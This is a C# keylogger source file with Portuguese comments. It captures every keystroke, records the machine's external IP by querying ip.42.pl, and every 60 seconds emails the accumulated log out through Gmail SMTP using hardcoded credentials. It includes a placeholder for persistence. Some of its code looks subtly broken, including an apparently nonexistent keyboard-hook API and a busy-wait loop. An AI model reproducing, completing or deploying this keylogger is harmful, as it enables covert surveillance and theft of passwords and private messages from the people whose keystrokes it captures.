using System;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using WindowsInput;
using WindowsInput.Native;

class Program
{
    private const string username = "mail@gmail.com";
    private const string password = "password";
    private const int sendTime = 60000; // 60 segundos

    static void Main()
    {
        SMS keyScanner = new SMS(username, password);
        keyScanner.Start();
    }
}

class SMS
{
    private string username;
    private string password;
    private int sendTime;
    private StringBuilder logAppend;
    private InputSimulator inputSimulator = new InputSimulator();

    public SMS(string username, string password)
    {
        this.username = username;
        this.password = password;
        this.sendTime = 60000; // 60 segundos
        this.logAppend = new StringBuilder("\nFrom " + GetExternalIP() + " >>> SMS started <<<");
    }

    private string GetExternalIP()
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadString("http://ip.42.pl/raw");
            }
        }
        catch
        {
            return "Unable to retrieve IP";
        }
    }

    public void BecomePersistent()
    {
        // Lógica para tornar o programa persistente (não incluída nesta versão)
    }

    public void MainListener()
    {
        DateTime startTime = DateTime.Now;

        using (var listener = new WindowsInput.EventSources.HardwareEventSource.KeyboardEventSource())
        {
            listener.KeyDown += (sender, args) =>
            {
                string key = args.VirtualKey.ToString();
                logAppend.Append(SonModding(key));
            };

            Console.WriteLine("Pressione qualquer tecla. As teclas serão enviadas a cada 60 segundos.");
            while (true)
            {
                if ((DateTime.Now - startTime).TotalMilliseconds >= sendTime)
                {
                    // Envia o log e reinicia o temporizador
                    SendingMail(logAppend.ToString());
                    logAppend.Clear();
                    logAppend.Append("\nFrom " + GetExternalIP() + " >>> ");
                    startTime = DateTime.Now;
                }
            }
        }
    }

    public string SonModding(string son)
    {
        son = son.Replace("Oem", "");
        switch (son)
        {
            case "Space":
                return " ";
            case "Enter":
                return "\n";
            case "Back":
                return "(del)";
            default:
                if (son.Contains("Key"))
                {
                    return "";
                }
                return son;
        }
    }

    public void SendingMail(string log)
    {
        try
        {
            using (SmtpClient client = new SmtpClient("smtp.gmail.com"))
            {
                client.Port = 587;
                client.Credentials = new NetworkCredential(username, password);
                client.EnableSsl = true;

                MailMessage mailMessage = new MailMessage(username, username, "Teclas Pressionadas", log);
                client.Send(mailMessage);
            }
        }
        catch
        {
            // Tratamento de exceção (não incluído nesta versão)
        }
    }

    public void Start()
    {
        BecomePersistent();

        Thread listenerThread = new Thread(MainListener);
        listenerThread.Start();

        Thread.Sleep(Timeout.Infinite);
    }
}

